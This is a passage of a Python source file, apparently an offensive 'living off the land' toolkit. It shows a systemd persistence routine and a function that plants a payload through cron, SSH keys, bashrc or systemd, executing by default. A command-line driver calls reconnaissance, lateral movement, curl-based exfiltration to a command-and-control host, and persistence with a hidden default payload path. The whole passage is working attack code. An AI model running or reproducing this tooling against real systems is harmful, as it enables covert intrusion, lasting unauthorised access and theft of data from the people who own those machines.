        command=mkdir_cmd,
        status="success" if rc1 == 0 else "failed",
        output=out1,
        error=err1,
        duration_ms=ms1,
    ))

    # Write service file using Python to avoid heredoc issues in shell=True
    write_py = (
        "python3 -c \"import os; os.makedirs(" + repr(service_dir) + ", exist_ok=True); "
        "open(" + repr(service_file) + ", 'w').write(" + repr(unit_content) + ")\""
    )
    rc2, out2, err2, ms2 = _run_cmd(write_py, timeout=10)
    steps.append(PersistStep(
        mechanism="systemd_write",
        command=write_py,
        status="success" if rc2 == 0 else "failed",
        output=out2,
        error=err2,
        duration_ms=ms2,
    ))

    rc3, out3, err3, ms3 = _run_cmd(enable_cmd, timeout=15)
    steps.append(PersistStep(
        mechanism="systemd_enable",
        command=enable_cmd,
        status="success" if rc3 == 0 else "failed",
        output=out3,
        error=err3,
        duration_ms=ms3,
    ))

    rc4, out4, err4, ms4 = _run_cmd(verify_cmd, timeout=10)
    verified = rc4 == 0 and out4.strip() in ("active", "enabled")
    steps.append(PersistStep(
        mechanism="systemd_verify",
        command=verify_cmd,
        status="success" if verified else "failed",
        output=out4,
        error=err4,
        duration_ms=ms4,
    ))

    return steps


def lotl_persist(
    host: str,
    payload: str,
    mechanism: str = "cron",
    dry_run: bool = False,
) -> PersistReport:
    """Deploy persistence using only system tools (cron, ssh keys, bashrc, systemd).

    Args:
        host: Target host identifier.
        payload: Path to the payload/script to persist.
        mechanism: Persistence mechanism — cron, ssh_key, bashrc, systemd (default: cron).
        dry_run: If True, return commands without executing (default: False — executes).

    Returns:
        PersistReport with each step's command, status, and output.
    """
    timestamp = _now()
    steps: list[PersistStep] = []

    mechanism_map = {
        "cron": lambda: _persist_cron(host, payload, dry_run),
        "ssh_key": lambda: _persist_ssh_key(host, payload, dry_run),
        "bashrc": lambda: _persist_bashrc(host, payload, dry_run),
        "systemd": lambda: _persist_systemd(host, payload, dry_run),
    }

    runner = mechanism_map.get(mechanism)
    if runner is None:
        steps.append(PersistStep(
            mechanism=mechanism,
            command="",
            status="failed",
            error="unknown mechanism: " + mechanism + " (supported: cron, ssh_key, bashrc, systemd)",
        ))
    else:
        try:
            steps.extend(runner())
        except Exception as exc:
            steps.append(PersistStep(
                mechanism=mechanism,
                command="",
                status="failed",
                error=str(exc),
            ))

    succeeded = sum(1 for s in steps if s.status == "success")
    failed = sum(1 for s in steps if s.status == "failed")
    not_found = sum(1 for s in steps if s.status == "not_found")
    dry_count = sum(1 for s in steps if s.status == "dry_run")

    summary = {
        "total_steps": len(steps),
        "succeeded": succeeded,
        "failed": failed,
        "tools_not_found": not_found,
        "dry_run_steps": dry_count,
        "mechanism": mechanism,
        "payload": payload,
    }

    return PersistReport(
        host=host,
        payload=payload,
        mechanism=mechanism,
        timestamp=timestamp,
        steps=steps,
        summary=summary,
    )


if __name__ == "__main__":
    import sys

    action = sys.argv[1] if len(sys.argv) > 1 else "recon"
    target = sys.argv[2] if len(sys.argv) > 2 else "localhost"

    if action == "recon":
        scan_type = sys.argv[3] if len(sys.argv) > 3 else "quick"
        r = lotl_recon(target, scan_type=scan_type)
        print("Recon on " + r.host + " (" + r.scan_type + "): " + str(r.summary["total_steps"]) + " steps")
        for s in r.steps:
            print("  [" + s.status + "] " + s.tool + ": " + s.command[:80])

    elif action == "lateral":
        dest = sys.argv[3] if len(sys.argv) > 3 else "10.0.0.10"
        method = sys.argv[4] if len(sys.argv) > 4 else "ssh"
        r = lotl_lateral_move(target, dest, method=method)
        print("Lateral " + r.method + " " + r.source_host + " -> " + r.target_host + ": " + str(r.summary["total_steps"]) + " steps")
        for s in r.steps:
            print("  [" + s.status + "] " + s.action + ": " + s.command[:80])

    elif action == "exfil":
        data = sys.argv[3] if len(sys.argv) > 3 else "/etc/hostname"
        c2 = sys.argv[4] if len(sys.argv) > 4 else "10.99.1.2"
        port = int(sys.argv[5]) if len(sys.argv) > 5 else 8080
        method = sys.argv[6] if len(sys.argv) > 6 else "curl"
        r = lotl_exfil(target, data, c2, port, method=method)
        print("Exfil " + r.method + " " + r.data_path + " -> " + r.c2_host + ":" + str(r.c2_port) + ": " + str(r.summary["total_steps"]) + " steps")
        for s in r.steps:
            print("  [" + s.status + "] " + s.action + ": " + s.command[:80])

    elif action == "persist":
        payload = sys.argv[3] if len(sys.argv) > 3 else "/tmp/.cache"
        mech = sys.argv[4] if len(sys.argv) > 4 else "cron"
        r = lotl_persist(target, payload, mechanism=mech)
        print("Persist " + r.mechanism + " on " + r.host + " (" + r.payload + "): " + str(r.summary["total_steps"]) + " steps")
        for s in r.steps:
            print("  [" + s.status + "] " + s.mechanism + ": " + s.command[:80])

    else:
        print("Usage: python lotl.py [recon|lateral|exfil|persist] [target] [options...]")
        sys.exit(1)
